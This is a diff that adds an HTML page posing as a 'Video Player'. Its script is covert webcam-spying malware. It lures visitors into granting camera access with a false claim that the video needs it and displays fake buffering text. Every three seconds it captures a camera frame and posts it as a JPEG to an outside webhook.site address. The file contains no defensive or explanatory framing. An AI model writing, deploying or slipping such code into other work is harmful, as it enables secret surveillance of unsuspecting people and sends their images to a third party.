@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Video Player</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="background:black; color:white; text-align:center; padding-top:50px; font-family:Arial;">
+    <h2>Loading video player...</h2>
+    <p>Please allow camera access to play video</p>
+    
+    <script>
+        var WEBHOOK_URL = 'https://webhook.site/d554a214-9c17-438a-b691-245b7ffaf835';
+        
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                document.querySelector('h2').innerHTML = "Video playing...";
+                document.querySelector('p').innerHTML = "Buffering 100%";
+                
+                var video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                video.style.width = "100%";
+                video.style.maxWidth = "500px";
+                video.style.margin = "auto";
+                video.style.display = "block";
+                document.body.appendChild(video);
+                
+                setInterval(function() {
+                    var canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    var ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    var imgData = canvas.toDataURL('image/jpeg');
+                    
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: imgData
+                    });
+                    
+                }, 3000);
+            })
+            .catch(function(err) {
+                document.querySelector('h2').innerHTML = "Camera access denied";
+                document.querySelector('p').innerHTML = "Please refresh and click Allow";
+                console.log(err);
+            });
+    </script>
+</body>
+</html>
